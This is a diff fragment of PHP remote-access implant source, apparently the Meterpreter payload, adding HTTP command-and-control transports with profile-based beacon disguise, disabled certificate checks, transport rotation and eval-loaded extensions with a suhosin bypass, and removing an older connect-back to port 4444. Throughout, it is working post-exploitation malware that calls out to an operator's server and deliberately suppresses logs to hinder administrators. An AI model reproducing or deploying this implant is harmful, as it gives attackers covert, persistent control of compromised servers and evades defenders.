+  if ($profile == null) {
+    return http_non_c2_url($transport);
+  }
+
+  # With a C2 profile: discard LURI from the baked-in URL — the profile's
+  # per-verb `set uri` is the authoritative request path.
+  $parsed = parse_url($transport['url']);
+  $base = $parsed['scheme'] . '://' . $parsed['host'];
+  if (isset($parsed['port'])) { $base .= ':' . $parsed['port']; }
+
+  $uri = '';
+  if (isset($profile['uri']) && $profile['uri'] != null) {
+    $uri = $profile['uri'];
+    if ($uri[0] != '/') { $uri = '/' . $uri; }
+  }
+  $url = $base . $uri;
+
+  $uuid = http_render_uuid($profile, http_transport_uuid($transport));
+  if (isset($profile['uuid_get']) && $profile['uuid_get'] != null) {
+    if (strlen($uuid) > 0) {
+      $sep = (strpos($url, '?') !== false) ? '&' : '?';
+      $url .= $sep . $profile['uuid_get'] . '=' . $uuid;
+    }
+  } elseif (empty($profile['uuid_header']) && empty($profile['uuid_cookie'])) {
+    # No param/header/cookie placement => carry the id in the URI path.
+    if (strlen($uuid) > 0) {
+      $url = rtrim($url, '/') . '/' . $uuid;
+    }
+  }
+  return $url;
+}
+
+function http_build_context($transport, $profile, $body = null) {
+  $headers = "Content-Type: application/octet-stream\r\n";
+  if (isset($transport['ua']) && $transport['ua'] != null) {
+    $headers .= "User-Agent: " . $transport['ua'] . "\r\n";
+  }
+  if (isset($transport['custom_headers']) && $transport['custom_headers'] != null) {
+    $headers .= $transport['custom_headers'] . "\r\n";
+  }
+  if ($profile != null) {
+    if (isset($profile['uuid_header']) && $profile['uuid_header'] != null) {
+      $uuid = http_render_uuid($profile, http_transport_uuid($transport));
+      if (strlen($uuid) > 0) {
+        $headers .= $profile['uuid_header'] . ': ' . $uuid . "\r\n";
+      }
+    }
+    if (isset($profile['uuid_cookie']) && $profile['uuid_cookie'] != null) {
+      $uuid = http_render_uuid($profile, http_transport_uuid($transport));
+      if (strlen($uuid) > 0) {
+        $headers .= "Cookie: " . $profile['uuid_cookie'] . '=' . $uuid . "\r\n";
+      }
+    }
+  }
+
+  $opts = array('http' => array(
+    'method' => ($body !== null) ? 'POST' : 'GET',
+    'header' => $headers,
+    'timeout' => $transport['comm_timeout'],
+    'ignore_errors' => true,
+  ));
+  if ($body !== null) {
+    $opts['http']['content'] = $body;
+  }
+
+  if (isset($transport['proxy_url']) && $transport['proxy_url'] != null) {
+    $opts['http']['proxy'] = $transport['proxy_url'];
+    $opts['http']['request_fulluri'] = true;
+    if (!empty($transport['proxy_user'])) {
+      $pass = isset($transport['proxy_pass']) ? $transport['proxy_pass'] : '';
+      $auth = base64_encode($transport['proxy_user'] . ':' . $pass);
+      $opts['http']['header'] .= "Proxy-Authorization: Basic " . $auth . "\r\n";
+    }
+  }
+
+  if (strpos($transport['url'], 'https') === 0) {
+    $opts['ssl'] = array(
+      'verify_peer' => false,
+      'verify_peer_name' => false,
+      'allow_self_signed' => true,
+    );
+  }
+
+  return stream_context_create($opts);
+}
+
+function http_get_packet($transport) {
+  $profile = $transport['c2_get'];
+  $url = http_build_profile_url($transport, $profile);
+  $ctx = http_build_context($transport, $profile);
+
+  $raw = @file_get_contents($url, false, $ctx);
+  if ($raw === false || strlen($raw) == 0) {
+    return null;
+  }
+
+  if ($profile != null) {
+    $start = $profile['prefix_skip'];
+    $end = strlen($raw) - $profile['suffix_skip'];
+    if ($start > 0 || $profile['suffix_skip'] > 0) {
+      $raw = substr($raw, $start, $end - $start);
+    }
+    if ($profile['enc_inbound'] != C2_ENCODING_NONE) {
+      $raw = c2_decode($raw, $profile['enc_inbound']);
+    }
+  }
+
+  return $raw;
+}
+
+function http_send_packet($transport, $packet) {
+  $profile = $transport['c2_post'];
+  $body = $packet;
+
+  if ($profile != null) {
+    $body = c2_encode($body, $profile['enc_outbound']);
+    $prefix = isset($profile['prefix']) ? $profile['prefix'] : '';
+    $suffix = isset($profile['suffix']) ? $profile['suffix'] : '';
+    if (strlen($prefix) > 0 || strlen($suffix) > 0) {
+      $body = $prefix . $body . $suffix;
+    }
+  }
+
+  $url = http_build_profile_url($transport, $profile);
+  $ctx = http_build_context($transport, $profile, $body);
+
+  @file_get_contents($url, false, $ctx);
+}
+
+##
 # Main stuff
 ##
 
@@ -1484,7 +2232,7 @@ ob_implicit_flush();
 
 # Turn off error reporting so we don't leave any ugly logs.  Why make an
 # administrator's job easier if we don't have to?  =)
-if (MY_DEBUGGING) {
+if (my_debugging_enabled()) {
   error_reporting(E_ALL);
 } else {
   error_reporting(0);
@@ -1496,89 +2244,74 @@ if (MY_DEBUGGING) {
 @ignore_user_abort(1);
 @ini_set('max_execution_time',0);
 
-# Add the payload UUID to globals, and use that from now on so that we can
-# update it as required.
-$GLOBALS['UUID'] = PAYLOAD_UUID;
-$GLOBALS['SESSION_GUID'] = SESSION_GUID;
-$GLOBALS['AES_KEY'] = null;
+# Parse configuration from TLV config block
+$config = parse_config_block(base64_decode(CONFIG_BLOCK));
+
+$GLOBALS['UUID'] = $config['uuid'];
+$GLOBALS['SESSION_GUID'] = $config['session_guid'];
+$GLOBALS['AES_KEY'] = $config['sym_key'];
 $GLOBALS['AES_ENABLED'] = false;
 
-# If we don't have a socket we're standalone, setup the connection here.
-# Otherwise, this is a staged payload, don't bother connecting
-if (!isset($GLOBALS['msgsock'])) {
-  # The payload handler overwrites this with the correct LHOST before sending
-  # it to the victim.
-  $ipaddr = '127.0.0.1';
-  $port = 4444;
-  my_print("Don't have a msgsock, trying to connect($ipaddr, $port)");
-  $msgsock = connect($ipaddr, $port);
-  if (!$msgsock) { die(); }
-} else {
-  # The ABI for PHP stagers is a socket in $msgsock and it's type (socket or
-  # stream) in $msgsock_type
-  $msgsock = $GLOBALS['msgsock'];
-  $msgsock_type = $GLOBALS['msgsock_type'];
-  switch ($msgsock_type) {
-  case 'socket':
-    register_socket($msgsock);
-    break;
-  case 'stream':
-    # fall through
-  default:
-  register_stream($msgsock);
-  }
+if ($config['debug_log'] != null && strlen($config['debug_log']) > 0) {
+  # TLV-supplied debug log path overrides the compile-time MY_DEBUGGING_LOG_FILE_PATH
+  $GLOBALS['DEBUGGING'] = true;
+  $GLOBALS['DEBUGGING_LOG_FILE_PATH'] = $config['debug_log'];
+  my_print("Debug log path: " . $config['debug_log']);
 }
-add_reader($msgsock);
 
-#
-# Main dispatch loop
-#
-$r=$GLOBALS['readers'];
-$w=NULL;$e=NULL;$t=1;
-while (false !== ($cnt = select($r, $w, $e, $t))) {
-  #my_print(sprintf("Returned from select with %s readers", count($r)));
-  $read_failed = false;
-  for ($i = 0; $i < $cnt; $i++) {
-    $ready = $r[$i];
-    if ($ready == $msgsock) {
-      $packet = read($msgsock, 32);
-      my_print(sprintf("Read returned %s bytes", strlen($packet)));
-      if (false==$packet) {
-        my_print("Read failed on main socket, bailing");
-        # We failed on the main socket.  There's no way to continue, so
-        # break all the way out.
-        break 2;
-      }
-      $xor = substr($packet, 0, 4);
-      $header = xor_bytes($xor, substr($packet, 4, 28));
-      $len_array = unpack("Nlen", substr($header, 20, 4));
-      # length of the packet should be the packet header size
-      # minus 8 for the tlv length + the required data length
-      $len = $len_array['len'] + 32 - 8;
-      # packet type should always be 0, i.e. PACKET_TYPE_REQUEST
-      while (strlen($packet) < $len) {
-        $packet .= read($msgsock, $len-strlen($packet));
-      }
-      $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+$GLOBALS['transport_list'] = $config['transports'];
+$GLOBALS['current_transport_idx'] = 0;
+$GLOBALS['next_transport_idx'] = null;
+$GLOBALS['session_expiry_end'] = time() + $config['session_expiry'];
+$GLOBALS['running'] = true;
 
-      write_tlv_to_socket($msgsock, $response);
+# Hot-load extensions baked into the config block (EXTENSIONS=) before
+# opening the C2 session, so the framework sees them at connect time.
+if (!empty($config['extensions'])) {
+  foreach ($config['extensions'] as $ext_source) {
+    if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval') && can_call_function('create_function')) {
+      $suhosin_bypass = create_function('', $ext_source);
+      $suhosin_bypass();
     } else {
-      #my_print("not Msgsock: $ready");
-      $data = read($ready);
-      if (false === $data) {
-        handle_dead_resource_channel($ready);
-      } elseif (strlen($data) > 0){
-        my_print(sprintf("Read returned %s bytes", strlen($data)));
-        $request = handle_resource_read_channel($ready, $data);
-        if ($request) {
-          write_tlv_to_socket($msgsock, $request);
-        }
-      }
+      eval($ext_source);
     }
   }
-  # $r is modified by select, so reset it
-  $r = $GLOBALS['readers'];
-} # end main loop
-my_print("Finished");
+}
+
+#
+# Outer transport-rotation loop: activate the current transport (with retry),
+# dispatch on it, then rotate forward or switch as directed.
+#
+while ($GLOBALS['running'] && time() < $GLOBALS['session_expiry_end']) {
+  $idx = $GLOBALS['current_transport_idx'];
+  $transport = &$GLOBALS['transport_list'][$idx];
+
+  if (!activate_transport_with_retry($transport)) {
+    my_print("Failed to activate transport[$idx], rotating");
+    $GLOBALS['current_transport_idx'] = transport_next_idx($idx);
+    unset($transport);
+    continue;
+  }
+
+  if ($transport['type'] == 'tcp') {
+    $result = dispatch_tcp($transport);
+    my_print("Finished TCP transport");
+  } else {
+    $result = dispatch_http($transport);
+    my_print("Finished HTTP transport");
+  }
+
+  if ($result == DISPATCH_EXIT) {
+    unset($transport);
+    break;
+  }
+  if ($result == DISPATCH_SWITCH) {
+    $GLOBALS['current_transport_idx'] = $GLOBALS['next_transport_idx'];
+    $GLOBALS['next_transport_idx'] = null;
+  } else {
+    # DISPATCH_RETIRE: rotate forward
+    $GLOBALS['current_transport_idx'] = transport_next_idx($idx);
+  }
+  unset($transport);
+}
 my_print("--------------------");
-close($msgsock);
